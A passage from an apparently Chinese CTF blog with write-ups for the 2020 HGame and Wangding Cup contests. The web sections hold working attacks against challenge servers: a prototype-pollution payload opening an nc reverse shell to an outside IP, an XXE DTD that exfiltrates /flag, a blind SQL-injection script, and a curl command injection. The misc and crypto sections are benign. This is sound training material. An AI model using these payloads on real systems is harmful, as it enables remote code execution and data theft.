  var body = JSON.parse(JSON.stringify(req.body));//原型链污染起点
  var copybody = clone(body)
  if (copybody.solution) {
    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)
  }
  res.end(&quot;提交成功&quot;+JSON.stringify(req.body))
})</code></pre>
<p>在注释处有一个奇怪的操作,转成json再转成解析成obj</p>
<p>这摆明了有问题,遇到<code>JSON.parse+merge</code> ,思路可以往原型链污染上走一走</p>
<p>我们继续阅读代码</p>
<p>跟进dealWithAttacks</p>
<pre><code class="javascript">this.dealWithAttacks = function (sekiro, solution) {
        if (sekiro.attackInfo.solution !== solution) {
            sekiro.health -= sekiro.attackInfo.attack
            if (sekiro.attackInfo.additionalEffect) {
                var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)
                sekiro = fn(sekiro)//look this
            }
        }
        sekiro.posture = (sekiro.posture &lt;= 500) ? sekiro.posture : 500
        sekiro.health = (sekiro.health &gt; 0) ? sekiro.health : 0
        if (sekiro.posture == 500 || sekiro.health == 0) {
            sekiro.alive = false
        }
        return sekiro
    }</code></pre>
<pre><code class="javascript">var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)
                sekiro = fn(sekiro)</code></pre>
<p>明显的代码执行,如果我们能控制<code>sekiro.attackInfo.additionalEffect</code>,那么便可以执行任意代码了</p>
<p>我们看一下<code>sekiro.attackInfo.additionalEffect</code>是如何获得的</p>
<pre><code class="javascript">this.attacks = [
        {
            &quot;method&quot;: &quot;连续砍击&quot;,
            &quot;attack&quot;: 1000,
            &quot;additionalEffect&quot;: &quot;sekiro.posture+=100&quot;,
            &quot;solution&quot;: &quot;连续格挡&quot;
        },
        {
            &quot;method&quot;: &quot;普通攻击&quot;,
            &quot;attack&quot;: 500,
            &quot;additionalEffect&quot;: &quot;sekiro.posture+=50&quot;,
            &quot;solution&quot;: &quot;格挡&quot;
        },
        {
            &quot;method&quot;: &quot;下段攻击&quot;,
            &quot;attack&quot;: 1000,
            &quot;solution&quot;: &quot;跳跃踩头&quot;
        },
        {
            &quot;method&quot;: &quot;突刺攻击&quot;,
            &quot;attack&quot;: 1000,
            &quot;solution&quot;: &quot;识破&quot;
        },
        {
            &quot;method&quot;: &quot;巴之雷&quot;,
            &quot;attack&quot;: 1000,
            &quot;solution&quot;: &quot;雷反&quot;
        },
    ]
    this.getAttackInfo = function () {
        return this.attacks[Math.floor(Math.random() * this.attacks.length)]
    }</code></pre>
<p>是从<code>attacks</code>中随机挑一个拿出来的,而其中某些是没有<code>additionalEffect</code>属性的</p>
<p>根据js根据原型链来查找属性的特性</p>
<p>我们可以用原型链污染来修改Object的additionalEffect属性</p>
<p>payload:</p>
<pre><code>POST /action HTTP/1.1
Host: sekiro.hgame.babelfish.ink
Content-Length: 169
Pragma: no-cache
Cache-Control: no-cache
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
Content-Type: application/json; charset=UTF-8
Referer: http://sekiro.hgame.babelfish.ink/
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: session=s%3A1PZpvTS3HgeMcmNynPUdu4Yd8B4A7Rlt.c2nTB%2F99oXNjyJljMJ0HZugi0SJnsE4juq2ZboRTH0g
Connection: close

{&quot;solution&quot;:123,&quot;__proto__&quot;:{&quot;additionalEffect&quot;:&quot;global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;nc 39.108.164.219 60000 -e /bin/sh&#39;,function(){});&quot;}}</code></pre><p>content-type要设置成<code>Content-Type: application/json</code></p>
<p>不然<code>__proto__</code>是无法当初键的,那么merge也就没用了</p>
<p><code>hgame{j@v4scr1pt_pr0t0tYp3-poLLut1on_4tt4ck_1s_d@ng3r20us}</code></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h3><p> <a href="http://rumkin.com/tools/cipher/morse.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/morse.php</a> </p>
<h3 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h3><p>就说说咋拿到密码的</p>
<p>压缩文件提示<code>End of Zip archive, comment: &quot;Password is picture ID.&quot;</code></p>
<p>利用搜索引擎(<code>Pixiv@純白可憐</code>)拿到密码</p>
<h3 id="克苏鲁神话"><a href="#克苏鲁神话" class="headerlink" title="克苏鲁神话"></a>克苏鲁神话</h3><p>解压得到一个文本和一个压缩包</p>
<p>观察文本和压缩包发现,二者的CRC值相同,于是考虑用明文攻击(不好意思,我是看着wiki遍历过去的)</p>
<p>然后拿到里面的word文档,但是是加密的,猝.</p>
<p>在看一下那个文本,有点像培根密码</p>
<pre><code class="python">s=&quot;of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.&quot;.replace(&quot; &quot;,&quot;&quot;)[:-1]
result=&quot;&quot;
for i in range(0,len(s),5):
    temp=&quot;&quot;
    for j in range(5):
        if s[i+j]==s[i+j].lower():
            temp+=&quot;0&quot;
        else :
            temp+=&quot;1&quot;
    result+=chr(int(temp,2)+ord(&#39;A&#39;))
print(result)</code></pre>
<p>于是拿到密码(HIDDENINTHEDOC),但是还没到头!!!!!百度一下word隐写,最后拿到flag</p>
<h3 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h3><p>解压得到password.txt和ok.zip</p>
<p>根据password.txt的提示,栅栏解密+凯撒密码得到压缩包密码.</p>
<p>拿到一堆ook直接上谷歌.ok了</p>
<p>base32-&gt;base64-&gt;二维码</p>
<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h3><p>直接套脚本</p>
<h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><pre><code class="python">#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import gmpy2
from secret import A, B, flag
assert flag.startswith(&#39;hgame{&#39;) and flag.endswith(&#39;}&#39;)

TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;
MOD = len(TABLE)

cipher = &#39;&#39;
for b in flag:
    i = TABLE.find(b)
    if i == -1:
        cipher += b
    else:
        ii = (A*i + B) % MOD
        cipher += TABLE[ii]

print(cipher)
# A8I5z{xr1A_J7ha_vG_TpH410}</code></pre>
<p>我们观察可以发现这其实是个单表替换加密</p>
<p>那么我们只要生成生成一个加密表就可以很容易的求出加密内容</p>
<p>但是唯一麻烦的是我们不知道A,B,但是我们知道明文的前几个字符hgame</p>
<p>于是有</p>
<pre><code class="python">TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;
MOD = len(TABLE)
cipher=&quot;A8I5z{xr1A_J7ha_vG_TpH410}&quot;

for A in range(1,MOD):
    for B in range(1,MOD):
        result=&quot;&quot;
        try :
            #生成加密表
            TABLE2={}
            for b in TABLE:
                i=TABLE.find(b)
                TABLE2[TABLE[(A*i + B) % MOD]]=b
            #解密
            for b in cipher:
                ii=TABLE.find(b)

                if ii==-1:
                    result+=b
                else :
                    result+=TABLE2[b]
        except :
            pass
        if &quot;hgame&quot; in result:
            print(result)
</code></pre>
<h3 id="Reorder"><a href="#Reorder" class="headerlink" title="Reorder"></a>Reorder</h3><p>这个是位置移动加密,输入一个和flag长度相同的字符串就知道如何解密了</p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><p>覆盖变量值来执行后门函数</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/2020hgame/">https://www.ccreater.top/1970/01/01/2020hgame/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/2020hgame/" data-id="ckmn5754l000bs1ni25ir5838" data-title="2020hgame" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020年网鼎杯青龙组" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/">2020年网鼎杯青龙组</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="2020年第二届“网鼎杯”网络安全大赛青龙组"><a href="#2020年第二届“网鼎杯”网络安全大赛青龙组" class="headerlink" title="2020年第二届“网鼎杯”网络安全大赛青龙组"></a>2020年第二届“网鼎杯”网络安全大赛青龙组</h2><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h3><p>测试发现DownloadServlet存在目录穿越漏洞<br>读取web.xml，然后依次读取对应的class文件<br> <a href="http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/web.xml" target="_blank" rel="noopener">http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/web.xml</a> </p>
<p>web.xml</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot; id=&quot;WebApp_ID&quot; version=&quot;2.5&quot;&gt;
  &lt;display-name&gt;file_in_java&lt;/display-name&gt;
  &lt;welcome-file-list&gt;
    &lt;welcome-file&gt;upload.jsp&lt;/welcome-file&gt;
  &lt;/welcome-file-list&gt;
  &lt;servlet&gt;
    &lt;description&gt;&lt;/description&gt;
    &lt;display-name&gt;UploadServlet&lt;/display-name&gt;
    &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;cn.abc.servlet.UploadServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
  &lt;servlet&gt;
    &lt;description&gt;&lt;/description&gt;
    &lt;display-name&gt;ListFileServlet&lt;/display-name&gt;
    &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;cn.abc.servlet.ListFileServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/ListFileServlet&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
  &lt;servlet&gt;
    &lt;description&gt;&lt;/description&gt;
    &lt;display-name&gt;DownloadServlet&lt;/display-name&gt;
    &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;cn.abc.servlet.DownloadServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
&lt;/web-app&gt;</code></pre>
<p> <a href="http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class" target="_blank" rel="noopener">http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class</a></p>
<p> DownloadServlet</p>
<pre><code class="java">package cn.abc.servlet;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.net.URLEncoder;
import javax.servlet.RequestDispatcher;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class DownloadServlet
  extends HttpServlet
{
  private static final long serialVersionUID = 1L;

  protected void doGet(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException
  {
    doPost(request, response);
  }

  protected void doPost(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException
  {
    String fileName = request.getParameter(&quot;filename&quot;);
    fileName = new String(fileName.getBytes(&quot;ISO8859-1&quot;), &quot;UTF-8&quot;);
    System.out.println(&quot;filename=&quot; + fileName);
    if ((fileName != null) &amp;&amp; (fileName.toLowerCase().contains(&quot;flag&quot;)))
    {
      request.setAttribute(&quot;message&quot;, &quot;��������&quot;);
      request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response);
      return;
    }
    String fileSaveRootPath = getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;);

    String path = findFileSavePathByFileName(fileName, fileSaveRootPath);

    File file = new File(path + &quot;/&quot; + fileName);
    if (!file.exists())
    {
      request.setAttribute(&quot;message&quot;, &quot;����������������������!&quot;);
      request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response);
      return;
    }
    String realname = fileName.substring(fileName.indexOf(&quot;_&quot;) + 1);

    response.setHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + URLEncoder.encode(realname, &quot;UTF-8&quot;));

    FileInputStream in = new FileInputStream(path + &quot;/&quot; + fileName);

    ServletOutputStream out = response.getOutputStream();

    byte[] buffer = new byte[&#39;?&#39;];
    int len = 0;
    while ((len = in.read(buffer)) &gt; 0) {
      out.write(buffer, 0, len);
    }
    in.close();

    out.close();
  }

  public String findFileSavePathByFileName(String filename, String saveRootPath)
  {
    int hashCode = filename.hashCode();
    int dir1 = hashCode &amp; 0xF;
    int dir2 = (hashCode &amp; 0xF0) &gt;&gt; 4;
    String dir = saveRootPath + &quot;/&quot; + dir1 + &quot;/&quot; + dir2;
    File file = new File(dir);
    if (!file.exists()) {
      file.mkdirs();
    }
    return dir;
  }
}
</code></pre>
<p>UploadServlet</p>
<pre><code class="java">package cn.abc.servlet;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintStream;
import java.util.List;
import java.util.UUID;
import javax.servlet.RequestDispatcher;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.FileUploadException;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;
import org.apache.poi.openxml4j.exceptions.InvalidFormatException;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.ss.usermodel.Workbook;
import org.apache.poi.ss.usermodel.WorkbookFactory;

public class UploadServlet
  extends HttpServlet
{
  private static final long serialVersionUID = 1L;

  protected void doGet(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException
  {
    doPost(request, response);
  }

  protected void doPost(HttpServletRequest request, HttpServletResponse response)
    throws ServletException, IOException
  {
    String savePath = getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;);

    String tempPath = getServletContext().getRealPath(&quot;/WEB-INF/temp&quot;);
    File tempFile = new File(tempPath);
    if (!tempFile.exists()) {
      tempFile.mkdir();
    }
    String message = &quot;&quot;;
    try
    {
      DiskFileItemFactory factory = new DiskFileItemFactory();

      factory.setSizeThreshold(102400);

      factory.setRepository(tempFile);

      ServletFileUpload upload = new ServletFileUpload(factory);

      upload.setProgressListener(new UploadServlet.1(this));

      upload.setHeaderEncoding(&quot;UTF-8&quot;);

      upload.setFileSizeMax(1048576L);

      upload.setSizeMax(10485760L);
      if (!ServletFileUpload.isMultipartContent(request)) {
        return;
      }
      List&lt;FileItem&gt; list = upload.parseRequest(request);
      for (FileItem fileItem : list) {
        if (fileItem.isFormField())
        {
          String name = fileItem.getFieldName();

          String str1 = fileItem.getString(&quot;UTF-8&quot;);
        }
        else
        {
          String filename = fileItem.getName();
          if ((filename != null) &amp;&amp; (!filename.trim().equals(&quot;&quot;)))
          {
            String fileExtName = filename.substring(filename.lastIndexOf(&quot;.&quot;) + 1);

            InputStream in = fileItem.getInputStream();
            if ((filename.startsWith(&quot;excel-&quot;)) &amp;&amp; (&quot;xlsx&quot;.equals(fileExtName))) {
              try
              {
                Workbook wb1 = WorkbookFactory.create(in);
                Sheet sheet = wb1.getSheetAt(0);
                System.out.println(sheet.getFirstRowNum());
              }
              catch (InvalidFormatException e)
              {
                System.err.println(&quot;poi-ooxml-3.10 has something wrong&quot;);
                e.printStackTrace();
              }
            }
            String saveFilename = makeFileName(filename);
            request.setAttribute(&quot;saveFilename&quot;, saveFilename);
            request.setAttribute(&quot;filename&quot;, filename);

            String realSavePath = makePath(saveFilename, savePath);

            FileOutputStream out = new FileOutputStream(realSavePath + &quot;/&quot; + saveFilename);

            byte[] buffer = new byte[&#39;?&#39;];

            int len = 0;
            while ((len = in.read(buffer)) &gt; 0) {
              out.write(buffer, 0, len);
            }
            in.close();

            out.close();

            message = &quot;������������!&quot;;
          }
        }
      }
    }
    catch (FileUploadException e)
    {
      e.printStackTrace();
    }
    request.setAttribute(&quot;message&quot;, message);
    request.getRequestDispatcher(&quot;/ListFileServlet&quot;).forward(request, response);
  }

  private String makeFileName(String filename)
  {
    return UUID.randomUUID().toString() + &quot;_&quot; + filename;
  }

  private String makePath(String filename, String savePath)
  {
    int hashCode = filename.hashCode();
    int dir1 = hashCode &amp; 0xF;
    int dir2 = (hashCode &amp; 0xF0) &gt;&gt; 4;

    String dir = savePath + &quot;/&quot; + dir1 + &quot;/&quot; + dir2;

    File file = new File(dir);
    if (!file.exists()) {
      file.mkdirs();
    }
    return dir;
  }
}
</code></pre>
<p>在报错中我们看到 poi-ooxml-3.10<br>谷歌下可以发现它其实是有个漏洞的<a href="https://www.cnblogs.com/iyiyang/articles/10055824.html" target="_blank" rel="noopener">https://www.cnblogs.com/iyiyang/articles/10055824.html</a></p>
<p>在服务器上放个evil.dtd,内容为：</p>
<pre><code class="xml=">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;
&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://ccreater.top:60004/?%file;&#39;&gt;&quot;&gt;
%all;
</code></pre>
<p>分别在 <code>[Content_Types].xml、/xl/workbook.xml、/xl/worksheets/shee1.xml</code>  中添加<br><code>&lt;!DOCTYPE ANY SYSTEM &quot;http://ccreater.top:60000/evil.dtd&quot;&gt;  在根元素中添加&lt;b&gt;&amp;send&lt;/b&gt;</code></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200510180925.png" alt="image9568"></p>
<p> 监听端口拿到flag</p>
<h3 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h3><pre><code class="php">&lt;?php

class FileHandler {

    public $op;
    public $filename;
    public $content;

    function __construct() {
        $op = &quot;2e0&quot;;
        $filename = &quot;flag.php&quot;;
    }

    public function set($filename) {
        $this-&gt;op = &#39;2e0&#39;;
        $this-&gt;filename = $filename;
    }
}


$url = &#39;http://5f56366ab1864e38b5d46f4b070e8082a5878207423a4008.cloudgame1.ichunqiu.com/?str=&#39;;

$file = new FileHandler;
$file-&gt;set($_GET[1]);

$payload = urlencode(serialize($file));
echo file_get_contents($url . $payload);

#echo urlencode(serialize($payload));

</code></pre>
<p>利用弱类型比较来绕过<code>if($this-&gt;op === &quot;2&quot;)$this-&gt;op = &quot;1&quot;;</code><br>将FileHandler中的变量改为public来绕过is_valid的限制<br>读取 /proc/self/cmdline 得知配置文件：<code>/web/config/httpd.conf</code><br>读取配置文件得知 web目录：<code>DocumentRoot &quot;/web/html&quot;</code><br>读取flag:<code>/web/html/flag.php</code></p>
<h3 id="trace"><a href="#trace" class="headerlink" title="trace"></a>trace</h3><p>只有一个register.php,fuzz方向存在sql注入漏洞<br>由于题目限制最多只能插入20个数据，于是我们让mysql在运算的时候报错就不会插入数据，避免了多次重开容器的麻烦<br>测试后，具体payload为:<code>username=&#39;,&#39;aaa&#39;-if(ascii(select substr(database(),1,1))&gt;1,sleep(5)-exp(~(select * from(select user())a)),exp(~(select * from(select user())a))))%23&amp;password=aaa</code></p>
<p>因为information_schema被过滤，还有其他的一些能够查询表名的表不存在，于是只能猜测表名</p>
<p>盲注脚本：</p>
<pre><code class="python">import requests
import time


#修改bigger和sqlinj就好


#实现bigger才能使用
def findByDichotomy(begin,end):
    max_num=end
    while True:
        mid=int((begin+end)/2)
        if begin==max_num:
            return False
        if begin==end:
            return begin
        if end-begin==1:
            if bigger(begin):
                return end
            else:
                return begin
        if bigger(mid):
            begin=mid+1
        else:
            end=mid
#待求数据大于num
def bigger(num):
    time.sleep(0.5)
    sql=&quot;select group_concat(b) from (select (select 1)a,(select 2)b union select * from flag)`table`&quot;
    burp0_url = &quot;http://2e22e4f7edf54994ae0a08c8acf108e6b85804ee8a8144c6.cloudgame2.ichunqiu.com:80/register_do.php&quot;
    burp0_cookies = {&quot;UM_distinctid&quot;: &quot;16f8014229c357-04d5c848290106-6701b35-240000-16f8014229d768&quot;, &quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943&quot;: &quot;1587227364&quot;, &quot;Hm_lpvt_2d0601bd28de7d49818249cf35d95943&quot;: &quot;1589089931&quot;, &quot;__jsluid_h&quot;: &quot;5303c9bcf8d25c671142a156f959a817&quot;}
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://2e22e4f7edf54994ae0a08c8acf108e6b85804ee8a8144c6.cloudgame2.ichunqiu.com/register.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    burp0_data = {&quot;username&quot;: &quot;&#39;,&#39;aaa&#39;-if((ascii(substr(( {sql} ),{POS},2))&gt;{GUESS}),sleep(2)-exp(~(select * from(select user())a)),exp(~(select * from(select user())a))))#&quot;.format(GUESS=num,POS=pos,sql=sql), &quot;password&quot;: &quot;aaa&quot;}
    try:
        r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,timeout=2)
    except Exception:
        return True
    print(&quot;test &quot;+str(num))
    print(r.text)
    return False
def less(num):
    pass
def equal(num):
    pass


#1,flag{}
result=&quot;2,flag{&quot;
pos=len(result)+1
while True:
    num=findByDichotomy(32,128)
    if num is False:
        print(result)
        break
    result+=chr(num)
    print(result)
    pos+=1</code></pre>
<h3 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h3><p>源代码:</p>
<pre><code class="javascript">var express = require(&#39;express&#39;);
var path = require(&#39;path&#39;);
const undefsafe = require(&#39;undefsafe&#39;);
const { exec } = require(&#39;child_process&#39;);


var app = express();
class Notes {
    constructor() {
        this.owner = &quot;whoknows&quot;;
        this.num = 0;
        this.note_list = {};
    }

    write_note(author, raw_note) {
        this.note_list[(this.num++).toString()] = {&quot;author&quot;: author,&quot;raw_note&quot;:raw_note};
    }

    get_note(id) {
        var r = {}
        undefsafe(r, id, undefsafe(this.note_list, id));
        return r;
    }

    edit_note(id, author, raw) {
        undefsafe(this.note_list, id + &#39;.author&#39;, author);
        undefsafe(this.note_list, id + &#39;.raw_note&#39;, raw);
    }

    get_all_notes() {
        return this.note_list;
    }

    remove_note(id) {
        delete this.note_list[id];
    }
}

var notes = new Notes();
notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#39;s first note&quot;);


app.set(&#39;views&#39;, path.join(__dirname, &#39;views&#39;));
app.set(&#39;view engine&#39;, &#39;pug&#39;);

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, &#39;public&#39;)));


app.get(&#39;/&#39;, function(req, res, next) {
  res.render(&#39;index&#39;, { title: &#39;Notebook&#39; });
});

app.route(&#39;/add_note&#39;)
    .get(function(req, res) {
        res.render(&#39;mess&#39;, {message: &#39;please use POST to add a note&#39;});
    })
    .post(function(req, res) {
        let author = req.body.author;
        let raw = req.body.raw;
        if (author &amp;&amp; raw) {
            notes.write_note(author, raw);
            res.render(&#39;mess&#39;, {message: &quot;add note sucess&quot;});
        } else {
            res.render(&#39;mess&#39;, {message: &quot;did not add note&quot;});
        }
    })

app.route(&#39;/edit_note&#39;)
    .get(function(req, res) {
        res.render(&#39;mess&#39;, {message: &quot;please use POST to edit a note&quot;});
    })
    .post(function(req, res) {
        let id = req.body.id;
        let author = req.body.author;
        let enote = req.body.raw;
        if (id &amp;&amp; author &amp;&amp; enote) {
            notes.edit_note(id, author, enote);
            res.render(&#39;mess&#39;, {message: &quot;edit note sucess&quot;});
        } else {
            res.render(&#39;mess&#39;, {message: &quot;edit note failed&quot;});
        }
    })

app.route(&#39;/delete_note&#39;)
    .get(function(req, res) {
        res.render(&#39;mess&#39;, {message: &quot;please use POST to delete a note&quot;});
    })
    .post(function(req, res) {
        let id = req.body.id;
        if (id) {
            notes.remove_note(id);
            res.render(&#39;mess&#39;, {message: &quot;delete done&quot;});
        } else {
            res.render(&#39;mess&#39;, {message: &quot;delete failed&quot;});
        }
    })

app.route(&#39;/notes&#39;)
    .get(function(req, res) {
        let q = req.query.q;
        let a_note;
        if (typeof(q) === &quot;undefined&quot;) {
            a_note = notes.get_all_notes();
        } else {
            a_note = notes.get_note(q);
        }
        res.render(&#39;note&#39;, {list: a_note});
    })

app.route(&#39;/status&#39;)
    .get(function(req, res) {
        let commands = {
            &quot;script-1&quot;: &quot;uptime&quot;,
            &quot;script-2&quot;: &quot;free -m&quot;
        };
        for (let index in commands) {
            exec(commands[index], {shell:&#39;/bin/bash&#39;}, (err, stdout, stderr) =&gt; {
                if (err) {
                    return;
                }
                console.log(`stdout: ${stdout}`);
            });
        }
        res.send(&#39;OK&#39;);
        res.end();
    })


app.use(function(req, res, next) {
  res.status(404).send(&#39;Sorry cant find that!&#39;);
});


app.use(function(err, req, res, next) {
  console.error(err.stack);
  res.status(500).send(&#39;Something broke!&#39;);
});


const port = 8080;
app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:${port}`))
</code></pre>
<p>谷歌发现unsafe的某些版本存在原型链污染漏洞 <a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940</a></p>
<p>阅读代码发现可以通过edit_note来污染原型链结合status处来命令执行</p>
<p>payload:<code>id=__proto__.abc&amp;author=curl http://http.requestbin.buuoj.cn/19tjk5d1?aaaaa=1&amp;raw=ls</code></p>
<p>令我有些不解的是，我本地复现payload为：<code>id=__proto__&amp;author=curl http://http.requestbin.buuoj.cn/19tjk5d1?aaaaa=1&amp;raw=ls</code>,本地是可以的，打靶机的时候反而不行</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/2020年网鼎杯青龙组/">https://www.ccreater.top/1970/01/01/2020年网鼎杯青龙组/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/" data-id="ckmn5754m000cs1ni5dtn8g6x" data-title="2020年网鼎杯青龙组" class="article-share-link">Share</a>
      
	  
      
      
